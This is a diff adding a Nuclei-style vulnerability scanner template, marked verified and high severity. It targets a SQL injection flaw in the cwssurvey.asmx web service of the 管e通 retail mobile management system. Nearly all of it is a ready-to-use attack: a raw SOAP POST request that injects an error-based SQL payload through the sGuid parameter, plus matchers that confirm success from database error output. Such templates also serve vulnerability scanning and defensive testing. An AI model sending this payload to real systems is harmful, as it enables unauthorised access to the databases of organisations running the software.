@@ -1,0 +1,45 @@
+id: enjoyit-cwssurvey-sqli
+info:
+  name: 管e通零售移动管理系统软件 cwssurvey.asmx 存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/60422/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: enjoyit,sqli
+
+http:
+  - raw:
+      - |
+        POST /enjoyRMIS_WS/WS/BaseInfo/cwssurvey.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 438
+        Connection: close
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                      xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+                      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetSurveyAnswerByGuid1 xmlns="http://tempuri.org/">
+              <sGuid>1'and 1=@@servicename and '1'='1</sGuid>
+              <sProvider></sProvider>
+            </GetSurveyAnswerByGuid1>
+          </soap:Body>
+        </soap:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'nvarchar')
+        condition: and
